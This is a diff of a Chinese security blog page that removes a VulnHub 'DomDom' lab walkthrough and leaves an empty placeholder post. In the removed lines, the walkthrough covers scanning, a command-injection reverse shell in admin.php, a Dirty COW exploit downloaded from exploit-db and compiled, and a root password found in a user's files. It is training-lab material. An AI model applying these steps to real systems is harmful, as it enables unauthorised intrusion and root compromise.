@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="vulnhub靶场DomDom, Cx330 计算机 网络安全 渗透测试">
+    <meta name="keywords" content="toc-heading-17, Cx330 计算机 网络安全 渗透测试">
     <meta name="description" content="专科 | 电子信息工程 | 网络安全">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>vulnhub靶场DomDom | Cx330</title>
+    <title>toc-heading-17 | Cx330</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -355,12 +355,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdnjson.com/images/2022/11/16/bg.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/14.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">vulnhub靶场DomDom</h1>
+                    <h1 class="description center-align post-title">toc-heading-17</h1>
                 </div>
             </div>
         </div>
@@ -477,29 +477,12 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                    <div class="article-tag">
-                        
-                            <a href="/tags/Web-Security/">
-                                <span class="chip bg-color">Web Security</span>
-                            </a>
-                        
-                            <a href="/tags/vulnhub/">
-                                <span class="chip bg-color">vulnhub</span>
-                            </a>
-                        
-                    </div>
+                          <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                          </div>
                     
                 </div>
                 <div class="col s5 right-align">
-                    
-                    <div class="post-cate">
-                        <i class="fas fa-bookmark fa-fw icon-category"></i>
-                        
-                            <a href="/categories/vulnhub/" class="post-category">
-                                vulnhub
-                            </a>
-                        
-                    </div>
                     
                 </div>
             </div>
@@ -508,21 +491,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-11-16
+                    2022-11-17
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-11-16
+                    2022-11-17
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    358
+                    0
                 </div>
                 
 
@@ -549,58 +532,7 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h3 id="0x000-靶场描述"><a href="#0x000-靶场描述" class="headerlink" title="0x000 靶场描述"></a>0x000 靶场描述</h3><hr>
-<p>你对PHP程序的理解程度如何？您对 Linux 错误配置有多熟悉？此图像将涵盖高级 Web 攻击、开箱即用的思维和最新的安全漏洞。</p>
-<p>此靶场没有flag，获取到root权限即可。。。</p>
-<hr>
-<h3 id="0x001-靶场下载"><a href="#0x001-靶场下载" class="headerlink" title="0x001 靶场下载"></a>0x001 靶场下载</h3><hr>
-<p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/domdom-1,328/">https://www.vulnhub.com/entry/domdom-1,328/</a></p>
-<hr>
-<h3 id="0x002-信息收集"><a href="#0x002-信息收集" class="headerlink" title="0x002 信息收集"></a>0x002 信息收集</h3><hr>
-<h4 id="探测存活主机"><a href="#探测存活主机" class="headerlink" title="探测存活主机"></a>探测存活主机</h4><p><code>netdiscover -r 192.168.1.0/24</code></p>
-<p><img src="https://cdnjson.com/images/2022/11/16/143e6c67d2aa43da7.png" alt="探测存活主机"></p>
-<h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><p><code>nmap -sS -sV -A -p 1-65535 192.168.1.106</code></p>
-<p><img src="https://cdnjson.com/images/2022/11/16/2f2eb39d751aa4b4d.png" alt="端口扫描"></p>
-<h4 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h4><p><code>dirsearch -u http://192.168.1.106/</code></p>
-<p><img src="https://cdnjson.com/images/2022/11/16/3ad02431eef49650d.png" alt="目录扫描"></p>
-<hr>
-<h3 id="0x003-命令执行漏洞"><a href="#0x003-命令执行漏洞" class="headerlink" title="0x003 命令执行漏洞"></a>0x003 命令执行漏洞</h3><hr>
-<p>访问网站</p>
-<p><img src="https://cdnjson.com/images/2022/11/16/42a8f178334931af5.png" alt="index.php"></p>
-<p><img src="https://cdnjson.com/images/2022/11/16/50facb38fb3fcc13d.png" alt="admin.php"></p>
-<p>使用burpsuite抓包测试，发现admin.php存在命令执行漏洞；因此可以执行一个反弹shell从而getshell</p>
-<p><img src="https://cdnjson.com/images/2022/11/16/6f5197b65b2507978.png" alt="index.php"></p>
-<p><img src="https://cdnjson.com/images/2022/11/16/7316d820ef88b46e2.png" alt="admin.php"></p>
-<p><a target="_blank" rel="noopener" href="https://www.revshells.com/">https://www.revshells.com/</a> 网站生成反弹shell</p>
-<p><img src="https://cdnjson.com/images/2022/11/16/8db8fbad4169f24c0.png" alt="php_shell"></p>
-<p>成功获取到shell</p>
-<p><img src="https://cdnjson.com/images/2022/11/16/9721feaae6743b7a5.png" alt="shell"></p>
-<p>切换交互模式：<code>python3 -c 'import pty;pty.spawn("/bin/bash")'</code> </p>
-<hr>
-<h3 id="0x004-提权"><a href="#0x004-提权" class="headerlink" title="0x004 提权"></a>0x004 提权</h3><hr>
-<h4 id="脏牛提权"><a href="#脏牛提权" class="headerlink" title="脏牛提权"></a>脏牛提权</h4><p>uname -a 查看当前系统版本为 Linux ubuntu 4.4.0-21-generic</p>
-<p>可以下载漏洞检测脚本进行检测 <a target="_blank" rel="noopener" href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a></p>
-<p>检测到CVE-2016-5195，典型的脏牛提权漏洞</p>
-<p><img src="https://cdnjson.com/images/2022/11/16/1047886455b0a4f920.png" alt="CVE-2016-5195"></p>
-<p>下载利用exp：<code>wget https://www.exploit-db.com/download/40616</code></p>
-<pre class=" language-bash"><code class="language-bash"><span class="token function">mv</span> 40616 exp.c
-gcc exp.c -o exp -pthread
-<span class="token function">chmod</span> +x exp
-</code></pre>
-<blockquote>
-<p>这里编译的时候可能会报错，不用管</p>
-</blockquote>
-<p><img src="https://cdnjson.com/images/2022/11/16/1181836ec9e9664771.png" alt="root"></p>
-<h4 id="root密码登陆提权"><a href="#root密码登陆提权" class="headerlink" title="root密码登陆提权"></a>root密码登陆提权</h4><p>查找特殊权限的文件：<code>getcap -r / 2&gt;/dev/null</code></p>
-<p><img src="https://cdnjson.com/images/2022/11/16/128f7671c0e50cb324.png" alt="getcap"></p>
-<p>打包用户 domom 目录</p>
-<pre class=" language-bash"><code class="language-bash"><span class="token function">tar</span> -cvf domom.tar /home/domom
-<span class="token function">tar</span> -xvf domom.tar
-<span class="token function">cat</span> README.md
-</code></pre>
-<p>找到了root密码：<code>Mj7AGmPR-m&amp;Vf&gt;Ry{}LJRBS5nc+*V.#a</code></p>
-<p><img src="https://cdnjson.com/images/2022/11/16/13f91a89e577cb232e.png" alt="root"></p>
-
+                
                 
             </div>
             <hr/>
@@ -626,7 +558,7 @@ gcc exp.c -o exp -pthread
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://Cx330Lm.github.io/2022/11/16/toc-heading-16/">http://Cx330Lm.github.io/2022/11/16/toc-heading-16/</a>
+                    <a href="http://Cx330Lm.github.io/2022/11/17/toc-heading-17/">http://Cx330Lm.github.io/2022/11/17/toc-heading-17/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -663,15 +595,7 @@ gcc exp.c -o exp -pthread
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            
-                                <a href="/tags/Web-Security/">
-                                    <span class="chip bg-color">Web Security</span>
-                                </a>
-                            
-                                <a href="/tags/vulnhub/">
-                                    <span class="chip bg-color">vulnhub</span>
-                                </a>
-                            
+                            <span class="chip bg-color">无标签</span>
                         </div>
                     
                 </div>
@@ -976,9 +900,10 @@ gcc exp.c -o exp -pthread
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2022/11/17/toc-heading-17/">
                     <div class="card-image">
@@ -996,9 +921,9 @@ gcc exp.c -o exp -pthread
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-11-17
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-11-17
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -1007,6 +932,7 @@ gcc exp.c -o exp -pthread
                         </span>
                     </div>
                 </div>
+
                 
             </div>
         </div>
@@ -1017,12 +943,12 @@ gcc exp.c -o exp -pthread
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/11/15/toc-heading-15/">
+                <a href="/2022/11/16/toc-heading-16/">
                     <div class="card-image">
                         
-                        <img src="https://cdnjson.com/images/2022/11/16/27.png" class="responsive-img" alt="vulnhub靶场Trollcave">
+                        <img src="https://cdnjson.com/images/2022/11/16/bg.png" class="responsive-img" alt="vulnhub靶场DomDom">
                         
-                        <span class="card-title">vulnhub靶场Trollcave</span>
+                        <span class="card-title">vulnhub靶场DomDom</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1033,7 +959,7 @@ gcc exp.c -o exp -pthread
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-11-15
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-11-16
                             </span>
                         <span class="publish-author">
                             
